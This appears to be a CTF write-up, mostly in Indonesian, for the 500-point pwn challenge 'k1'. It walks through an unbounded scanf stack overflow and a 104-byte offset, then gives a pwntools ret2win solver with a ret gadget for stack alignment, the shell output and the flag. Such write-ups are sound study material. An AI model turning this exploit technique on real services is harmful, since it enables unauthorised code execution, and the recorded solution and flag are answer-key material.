# WriteUp - k1

## Overview

* **Name:** k1
* **Category:** Binary Exploitation (Pwn)
* **Point:** 500
* **Author:** Ryu
* **Desc:** Got Win
* **URL:** nc 13.250.8.136 11101

## Reconnaissance

```text
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9bce2612c04c144d2f7e88f7f6c4916b142e2fe, for GNU/Linux 3.2.0, not stripped

$ checksec --file=chall
[*] '/home/wanzkey/LKSP_2026/Pwn/k1/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

```c
// Full IDA Decompile

1. main
int __fastcall main(int argc, const char **argv, const char **envp)
{
  vuln(argc, argv, envp);
  return 0;
}

2. vuln
int vuln()
{
  _BYTE v1[64]; // [rsp+0h] [rbp-60h] BYREF
  char s1[8]; // [rsp+40h] [rbp-20h] BYREF
  _WORD v3[11]; // [rsp+48h] [rbp-18h] BYREF

  *(_QWORD *)s1 = 0x6465696E6544LL;
  memset(v3, 0, sizeof(v3));
  printf("Input text : ");
  __isoc99_scanf("%s", v1);
  if ( !strcmp(s1, "Granted") )
    return puts("Access granted");
  else
    return puts("Access denied");
}

3. win
int win()
{
  puts("Congratulations!");
  return system("/bin/sh");
}

```

## Step by Step Solution

### 1. Analisis Kerentanan Buffer Overflow pada `scanf`

**Identifikasi Titik Lemah:** Fungsi `vuln` pada *binary* menggunakan pemanggilan `__isoc99_scanf("%s", v1)` untuk menerima input teks dari pengguna tanpa membatasi panjang karakter yang masuk. Mengingat proteksi *Stack Canary* tidak aktif, ketiadaan batasan ini membuka ruang untuk eksploitasi *buffer overflow* secara langsung untuk menimpa struktur di dalam *stack*.

### 2. Kalkulasi Jarak Menuju Return Address

**Pemetaan Offset Register:** Berdasarkan dekompilasi statis dan analisis dinamis menggunakan GDB `pwndbg`, variabel array `v1` berlokasi di memori pada *offset* `[rbp-60h]`. Nilai heksadesimal `0x60` setara dengan 96 *bytes*. Pada arsitektur `x86-64`, diperlukan pengiriman 96 *bytes* data sampah (*junk*) untuk memenuhi buffer, ditambah 8 *bytes* tambahan untuk menimpa nilai *Base Pointer* (`RBP`). Dengan demikian, total *offset* eksak yang dibutuhkan untuk menguasai kendali atas eksekusi atau menimpa *Return Instruction Pointer* (`RIP`) adalah 104 *bytes*.

### 3. Eksekusi Ret2Win dan Penyelerasan Memori

**Bypass Stack Alignment MOVAPS:** Karena target serangan adalah memanggil fungsi `win()` yang memicu eksekusi `system("/bin/sh")`, kerentanan ini murni tergolong dalam teknik eksploitasi dasar *Ret2Win*. Namun, pada lingkungan server GLIBC 64-bit terbaru, fungsi `system()` mewajibkan posisi memori *stack pointer* (`RSP`) selaras dalam kelipatan 16-byte untuk instruksi `movaps`. Mengeksekusi secara langsung akan memicu galat `SIGSEGV` (menciptakan EOF saat mendapat *shell*). Oleh karena itu, satu buah *gadget* intruksi `ret` disisipkan ke dalam *payload* ROP sebelum alamat fungsi `win()` agar posisi memori tergeser tepat 8 *bytes* dan menjaga stabilitas sesi interaktif.

## Script Solver

```python
#!/usr/bin/env python3
from pwn import *

# Set target binary
exe = './chall'
elf = context.binary = ELF(exe)

# Remote server details
host = '13.250.8.136'
port = 11101

# Connect to the remote server
p = remote(host, port)

# Offset 104 bytes fix
offset = 104

# Cari instruksi 'ret' secara otomatis buat alignment
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"Found RET gadget at: {hex(ret_gadget)}")

# Build the payload
payload = b'A' * offset
payload += p64(ret_gadget)    # Fix stack alignment (MOVAPS issue)
payload += p64(elf.sym['win']) # Loncat ke target

# Send the payload
p.recvuntil(b'Input text : ')
log.info("Sending payload to overwrite RIP...")
p.sendline(payload)

# Get that shell bro!
p.interactive()

```

## Output Terminal Solver

```bash
$ ./solver.py
[*] '/home/wanzkey/LKSP_2026/Pwn/k1/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 13.250.8.136 on port 11101: Done
[*] Loaded 5 cached gadgets for './chall'
[*] Found RET gadget at: 0x40101a
[*] Sending payload to overwrite RIP...
[*] Switching to interactive mode
Access denied
Congratulations!
$ ls
chall
flag-e41e7807c164da3394105e2808cc00bc.txt
$ cat flag*
LKS{d61874b7303bbb6878d6233b2ffd2c8b}
$
[*] Interrupted
[*] Closed connection to 13.250.8.136 port 11101

```

## Flag

`LKS{d61874b7303bbb6878d6233b2ffd2c8b}`
